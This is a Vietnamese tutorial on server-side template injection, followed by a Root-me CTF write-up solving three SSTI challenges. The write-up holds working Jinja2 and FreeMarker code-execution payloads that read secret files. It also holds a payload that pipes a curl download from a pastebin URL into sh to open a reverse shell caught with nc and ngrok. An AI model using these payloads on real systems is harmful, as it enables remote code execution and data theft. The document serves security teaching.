# Server-side template injection (SSTI)

Tìm hiểu về SSTI (Khái niệm, nguyên nhân, tác hại + 1 số cách bypass, cách phòng tránh).
Giải hết các bài SSTI trên rootme

## Khái niệm

Server-Side Template Injection (SSTI) là một lỗ hổng bảo mật cho phép kẻ tấn công thực thi mã độc trên máy chủ web bằng cách chèn các đoạn mã vào các mẫu trên phía máy chủ. Lỗ hổng này xảy ra khi ứng dụng web sử dụng các mẫu để tạo nội dung trên phía máy chủ mà không kiểm soát được các đầu vào từ người dùng.

## Nguyên nhân

Server-side template injection xảy ra khi những nội dung được nhập vào từ phía người dùng được nhúng không an toàn vào template ở phía máy chủ, cho phép người sử dụng có thể inject template trực tiếp. Bằng cách sử dụng các template độc hại , kẻ tấn công có thể thực thi mã tùy ý và kiểm soát hoàn toàn web server. Mức độ nghiêm trọng của vấn đề này khác nhau tùy thuộc vào loại template engines được sử dụng. Các template engine có thể nằm trong phạm vi từ dễ dàng đến gần như không thể khai thác.

Xem xét ví dụ sau:

- Một ứng dụng marketing gửi hàng loạt các emails, và sử dụng Twig template để gửi lời chào đến khách hàng. Nếu chỉ có tên người dùng được truyền vào template như ví dụ sau, mọi thứ sẽ hoạt động tốt : `$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`

- Tuy nhiên, nếu người dùng được phép tùy chỉnh các email này, vấn đề sẽ phát sinh: `$output = $twig->render("Dear $_GET['name'],", array("first_name" => $user.first_name) );`

- Trong trường hợp này, người dùng kiểm soát nội dung của template thông qua tham số `GET http://vulnerable-website.com/?name={{bad-stuff-here}}`, thay vì giá trị được truyền vào nó.

## Tác hại

Các lỗ hổng server-side template injection(SSTI) có thể khiến các trang web phải đối mặt với nhiều cuộc tấn công khác nhau tùy thuộc vào template engine được đề cập và cách ứng dụng sử dụng nó như thế nào. Trong một số trường hợp hiếm hoi, những lỗ hổng này không gây ra rủi ro bảo mật thực sự. Tuy nhiên, hầu hết tác động của việc SSTI có thể rất thảm khốc.

Ở mức cuối nghiêm trọng của quy mô, kẻ tấn công có thể đạt được khả năng thực thi mã từ xa, chiếm toàn quyền kiểm soát máy chủ back-end và sử dụng nó để thực hiện các cuộc tấn công khác vào cơ sở hạ tầng nội bộ(pivoting).

Ngay cả trong trường hợp không thể thực thi toàn bộ mã từ xa, kẻ tấn công thường vẫn có thể sử dụng SSTI làm cơ sở cho nhiều cuộc tấn công khác, có khả năng giành được quyền truy cập đọc vào dữ liệu nhạy cảm và các tệp tùy ý trên máy chủ.

## Các bước khai thác

![](https://i.imgur.com/xX1dBF9.png)

**Detect:**
- Thử catch error mẫu bằng cách chèn một chuỗi ký tự đặc biệt thường được sử dụng trong biểu thức mẫu, chẳng hạn như đa ngôn ngữ `${{<%[%'"}}%\`.
- Thử với một số toán tử: 
    ```
    {{7*7}}
    ${7*7}
    <%= 7*7 %>
    ${{7*7}}
    #{7*7}
    *{7*7}
    ```

**Identify:**

![](https://i.imgur.com/6fRePHX.png)

**Exploit:**

- READ: Bước đầu tiên sau khi tìm thấy lỗ hổng ssti và xác định công cụ để tiêm là đọc tài liệu. 
- Explore: Sử dụng danh sách SecLists và bộ sưu tập wordlist của Burp Intruder để tấn công các tên biến.
- Attack: Sau khi có một ý tưởng rõ ràng về bề mặt tấn công thì chiến thôi

## Cách phòng tránh
Cách tốt nhất để ngăn chặn lỗi SSTI vào là không cho phép bất kỳ người dùng nào sửa đổi hoặc gửi các template mới. Tuy nhiên, điều này đôi khi không thể tránh khỏi do yêu cầu của doanh nghiệp.

Một trong những cách đơn giản nhất để tránh lỗ hổng SSTI là luôn sử dụng template engine “logic-less”, chẳng hạn như Mustache, trừ khi thực sự cần thiết. Tách các phép logic khỏi bản thảo càng nhiều càng tốt có thể làm giảm đáng kể khả năng tiếp xúc của bạn với các cuộc tấn công dựa trên template-based nguy hiểm nhất.

Một biện pháp khác là chỉ thực thi mã của người dùng trong môi trường sandboxed nơi các mô-đun và chức năng nguy hiểm tiềm ẩn đã bị loại bỏ hoàn toàn. Thật không may, sandboxing mã không đáng tin cậy(malicious code) vốn đã khó mà còn dễ bị bypass.

Cuối cùng, một cách tiếp cận bổ sung khác là chấp nhận việc thực thi mã tùy ý là có thể nhưng không thể tránh khỏi và áp dụng sanboxing của riêng bạn bằng cách triển khai môi trường template của bạn trong một vùng chứa Docker bị locked-down, chẳng hạn.



# Root-me/SSTI

## Python - Server-side Template Injection Introduction

![](https://i.imgur.com/4pgeSUp.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction

### Phân tích

![](https://i.imgur.com/BCFyhfm.png)

Mới đầu vào chall thì em nhận được form như trên

Thử nhập nội dung bất kỳ em được:

![](https://i.imgur.com/U8SAGC7.png)

Thử test với chuỗi ký tự sau ở từng input `${{<%[%'"}}%\`

Khi chuỗi được submit ở thẻ input title:

![](https://i.imgur.com/4lnXgRa.png)

Chương trình vẫn chạy.

Khi chuỗi được submit ở thẻ input page content:

![](https://i.imgur.com/uCyYEvU.png)

Đã có lỗi xảy ra và chương trình ngừng chạy.

Có vẻ lỗ hổng ở thẻ input page content.

Em tiếp tục test với những payload:

    ```
    {{7*7}}
    ${7*7}
    <%= 7*7 %>
    ${{7*7}}
    #{7*7}
    *{7*7}
    ```

Và Thấy rằng với input `{{7*7}}` thì em đã ssti thành công:

![](https://i.imgur.com/B4N5QXw.png)

Tiếp tục test với payload: `{{7*'7'}}`

![](https://i.imgur.com/6fRePHX.png)

Và em thấy kết quả trả về là:

![](https://i.imgur.com/CYpfU8g.png)

Vậy là em có thể xác định được server chall đang sử dụng Jinja2 hoặc Twig

### Khai thác

Lên Hacktrick và em tìm được payload rce với Jinja2:

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -lap').read() }}`

![](https://i.imgur.com/Om8PVTe.png)

Giờ chỉ cần cat file `.passwd` và lấy flag thui

Payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat .passwd').read() }}`




## Java - Server-side Template Injection

![](https://i.imgur.com/tCMS2Ce.png)

Link to chall: https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection

### Phân tích

Như bài trên em bắt đầu bằng việc fuzz từng payload:

    ```
    {{7*7}}
    ${7*7}
    <%= 7*7 %>
    ${{7*7}}
    #{7*7}
    *{7*7}
    ```
    
Và thấy `${7*7}` trả về kết quả em mong muốn:

![](https://i.imgur.com/55wbtHy.png)

### Khai thác

Truy cập vào Hacktrick tìm payload và em tìm được payload: `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls -lap")}`

![](https://i.imgur.com/mRLvMFk.png)

Giờ chỉ cần cat file SECRET_FLAG.txt và lấy flag thuii

![](https://i.imgur.com/nZWDlEf.png)



## Python - SSTI contournement de filtres en aveugle

![](https://i.imgur.com/FLryaEM.png)

Link to chall: https://www.root-me.org/fr/Challenges/Web-Serveur/Python-SSTI-contournement-de-filtres-en-aveugle

### Phân tích

Vào chall em có giao diện: 

![](https://i.imgur.com/r14jvmV.png)

Đặc biệt là có thể tại được source code về:

![](https://i.imgur.com/BVKfJow.png)

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Podalirius

import jinja2
from flask import Flask, flash, redirect, render_template, request, session, abort

mail = """
Hello team,

A new hacker wants to join our private Bug bounty program! Mary, can you schedule an interview?

 - Name: {{ hacker_name }}
 - Surname: {{ hacker_surname }}
 - Email: {{ hacker_email }}
 - Birth date: {{ hacker_bday }}

I'm sending you the details of the application in the attached CSV file:

 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'

Best regards,
"""

def sendmail(address, content):
    try:
        content += "\n\n{{ signature }}"
        _signature = """---\n<b>Offsec Team</b>\noffsecteam@hackorp.com"""
        content = jinja2.Template(content).render(signature=_signature)
    except Exception as e:
        pass
    return None

def sanitize(value):
    blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']
    for word in blacklist:
        if word in value:
            value = value.replace(word,'')
    if any([bool(w in value) for w in blacklist]):
        value = sanitize(value)
    return value

app = Flask(__name__, template_folder="./templates/", static_folder="./static/")
app.config['DEBUG'] = False

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")

@app.route("/", methods=['GET','POST'])
def register():
    global mail
    if request.method == "POST":
        if "name" in request.form.keys() and len(request.form["name"]) != 0 and "surname" in request.form.keys() and len(request.form["surname"]) != 0 and "email" in request.form.keys() and len(request.form["email"]) != 0 and "bday" in request.form.keys() and len(request.form["bday"]) != 0 :
            if len(request.form["name"]) > 20:
                return render_template("index.html", error="Field 'name' is too long.")
            if len(request.form["surname"]) >= 50:
                return render_template("index.html", error="Field 'surname' is too long.")
            if len(request.form["email"]) >= 50:
                return render_template("index.html", error="Field 'email' is too long.")
            if len(request.form["bday"]) > 10:
                return render_template("index.html", error="Field 'bday' is too long.")
            try:
                register_mail = jinja2.Template(mail).render(
                    hacker_name=sanitize(request.form["name"]),
                    hacker_surname=sanitize(request.form["surname"]),
                    hacker_email=sanitize(request.form["email"]),
                    hacker_bday=sanitize(request.form["bday"])
                )
            except Exception as e:
                pass
            sendmail("offsecteam@hackorp.com", register_mail)
            return render_template("index.html", success="Thank you! Your application will be reviewed within a week.")
        else:
            return render_template("index.html", error="Missing fields in the application form!")
    elif request.method == 'GET':
        return render_template("index.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=59073)
```

Sau khi đọc source xong thì em thấy rằng server đã filter những ký tự `blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']`

Nhưng lại nối các input của em lại với nhau ở: `{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv`

Vì bài này là blind nên em sẽ thêm print vào source có để xem mail được gửi đi như thế nào và em thu được kết quả:

![](https://i.imgur.com/8UGhtLC.png)

### Khai thác

Đầu tiên em `nc -lvnp 1337` để lắng nghe port 1337

![](https://i.imgur.com/xRNjcBf.png)

Tiếp thep em dùng `ngrok tcp 1337` để tạo mở cổng tcp từ port 1337 ra bên ngoài

![](https://i.imgur.com/a0mIOcO.png)

Tiếp theo là em copy port được tạo ra bởi ngrok (14673) rồi lên https://www.revshells.com/ để tạo reverse shell

Sau vài lần thử payload cuối cùng em tìm được:

Payload: `{{ cycler.__init__.__globals__.os.popen('curl https://pastebin.pl/view/raw/17662427|sh').read() }}`

Vì payload reverse shell dài quá nên em tạo file pastebin rồi sử dụng `curl` để lấy được đoạn shell đó, cuối dùng là `|sh` để chạy doạn shell lấy được

![](https://i.imgur.com/4ZNOiZi.png)

Và thế là đã revershell thành công, giờ em chỉ cần tìm file flag rồi cat thôi

![](https://i.imgur.com/AcM1yWn.png)

